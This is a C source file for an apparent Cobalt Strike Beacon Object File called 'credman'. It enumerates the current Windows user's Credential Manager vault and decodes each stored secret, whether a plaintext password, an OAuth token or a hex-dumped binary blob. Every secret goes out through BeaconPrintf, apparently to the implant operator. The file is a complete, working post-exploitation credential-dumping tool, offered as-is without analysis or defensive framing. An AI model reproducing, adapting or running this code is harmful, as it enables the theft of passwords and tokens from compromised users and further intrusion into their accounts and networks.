/*
 * credman - dump Windows Credential Manager entries for the current user.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

static const char *cred_type(DWORD t)
{
    switch (t) {
    case CRED_TYPE_GENERIC:                 return "generic";
    case CRED_TYPE_DOMAIN_PASSWORD:         return "domain-password";
    case CRED_TYPE_DOMAIN_CERTIFICATE:      return "domain-certificate";
    case CRED_TYPE_DOMAIN_VISIBLE_PASSWORD: return "domain-visible-password";
    case 5:                                 return "generic-certificate";
    case 6:                                 return "domain-extended";
    }
    return "unknown";
}

static void print_blob(const BYTE *blob, DWORD len)
{
    static const char hd[] = "0123456789abcdef";
    DWORD i, n = len;
    int wide = (len >= 2 && len % 2 == 0);
    char out[1024];
    int o = 0;

    if (!blob || !len) return;

    /* Credential blobs sometimes carry a trailing NUL. */
    while (n > 0 && blob[n - 1] == 0) n--;

    for (i = 1; i < len && wide; i += 2) {
        if (blob[i] != 0) wide = 0;
    }

    if (wide) {
        bof_w2a((const wchar_t *)blob, out, sizeof(out));
        BeaconPrintf(CALLBACK_OUTPUT, "    Secret : %s\n", out);
        return;
    }

    /* Printable ASCII secret (OAuth tokens, passwords, JSON, ...). */
    if (n > 0) {
        int text = 1;
        for (i = 0; i < n; i++) {
            BYTE b = blob[i];
            if (!((b >= 0x20 && b <= 0x7e) || b == '\t' ||
                  b == '\r' || b == '\n')) {
                text = 0;
                break;
            }
        }
        if (text) {
            DWORD c = n < (DWORD)sizeof(out) - 1 ? n : (DWORD)sizeof(out) - 1;
            for (i = 0; i < c; i++) out[i] = (char)blob[i];
            out[c] = 0;
            BeaconPrintf(CALLBACK_OUTPUT, "    Secret : %s%s\n", out,
                         n > c ? "..." : "");
            return;
        }
    }

    /* Binary blob: one contiguous hex line (BeaconPrintf is line-oriented). */
    {
        DWORD c = n < 256 ? n : 256;
        for (i = 0; i < c; i++) {
            out[o++] = hd[(blob[i] >> 4) & 0xf];
            out[o++] = hd[blob[i] & 0xf];
        }
        out[o] = 0;
        BeaconPrintf(CALLBACK_OUTPUT, "    Secret : [hex] %s%s\n", out,
                     n > c ? "..." : "");
    }
}

void go(char *args, int alen)
{
    PCREDENTIALA *creds = NULL;
    DWORD count = 0, i;
    (void)args; (void)alen;

    if (!ADVAPI32$CredEnumerateA(NULL, 0, &count, &creds)) {
        DWORD err = KERNEL32$GetLastError();
        if (err == ERROR_NOT_FOUND) {
            BeaconPrintf(CALLBACK_OUTPUT,
                         "Credential Manager has no entries for this user\n");
            return;
        }
        bof_error_win32("CredEnumerate", err,
                        err == ERROR_ACCESS_DENIED
                            ? "the current token cannot read this user's credential vault"
                            : "could not enumerate the current user's credentials");
        bof_error_context("filter", "(none)");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Credential Manager entries: %lu\n", (unsigned long)count);

    for (i = 0; i < count; i++) {
        PCREDENTIALA c = creds[i];
        BeaconPrintf(CALLBACK_OUTPUT, "\n[%lu] %s\n", (unsigned long)(i + 1),
                     c->TargetName ? c->TargetName : "(null)");
        if (c->UserName)
            BeaconPrintf(CALLBACK_OUTPUT, "    User   : %s\n", c->UserName);
        BeaconPrintf(CALLBACK_OUTPUT, "    Type   : %s (%lu)\n", cred_type(c->Type), (unsigned long)c->Type);
        BeaconPrintf(CALLBACK_OUTPUT, "    Persist: %lu\n", (unsigned long)c->Persist);
        if (c->Comment)
            BeaconPrintf(CALLBACK_OUTPUT, "    Comment: %s\n", c->Comment);
        print_blob(c->CredentialBlob, c->CredentialBlobSize);
    }

    ADVAPI32$CredFree(creds);
}
